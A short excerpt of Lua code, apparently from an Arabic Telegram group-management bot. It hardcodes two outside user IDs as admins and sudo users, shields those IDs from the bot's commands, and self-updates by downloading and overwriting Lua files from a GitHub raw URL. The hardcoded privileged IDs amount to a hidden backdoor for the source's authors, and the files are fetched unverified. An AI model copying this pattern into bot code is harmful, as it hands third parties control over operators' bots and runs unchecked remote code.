...
local Adminn = false
if msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 1714422669 then 
Adminn = true
...
download_file('https://raw.githubusercontent.com/FAWAZ5265/abaza/main/inc/Run.lua','./inc/Run.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'40% - |█████  @xb_0b     |') end
download_file('https://raw.githubusercontent.com/FAWAZ5265/abaza/main/inc/locks.lua','./inc/locks.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'60% - |███████  @xb_0b   |') end
download_file('https://raw.githubusercontent.com/FAWAZ5265/abaza/main/inc/Script.lua','./inc/Script.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'80% - |█████████ @xb_0b  |') end
download_file('https://raw.githubusercontent.com/FAWAZ5265/abaza/main/inc/functions.lua','./inc/functions.lua')
...
result = false
if msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 1714422669 then 
SudoBase = true
...
if UserID == 1619524486 or UserID == 1714422669 then return sendMsg(ChatID,MsgID,"- لا يمكنك تنفيذ الامر ضد مطور السورس ") end
